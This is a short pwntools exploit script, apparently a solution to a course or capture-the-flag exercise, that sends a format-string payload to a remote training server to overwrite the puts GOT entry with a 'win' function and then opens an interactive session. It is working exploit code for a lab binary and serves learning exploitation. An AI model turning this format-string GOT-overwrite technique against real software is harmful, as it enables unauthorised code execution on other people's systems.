from pwn import *

elf = ELF("07_call_functions")
win = elf.symbols['win']  # 0x8049216
puts_address = elf.got['puts']

HOST = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 23197

io = connect(HOST, PORT)

win_high = ((win >> 16) & 0xffff) - 8
win_low = (win & 0xffff) - win_high - 8

payload =  p32(puts_address + 2) + p32(puts_address) + (f'%{win_high}x%7$hn').encode() + (f'%{win_low}x%8$hn').encode()
io.sendline(payload)
io.interactive()
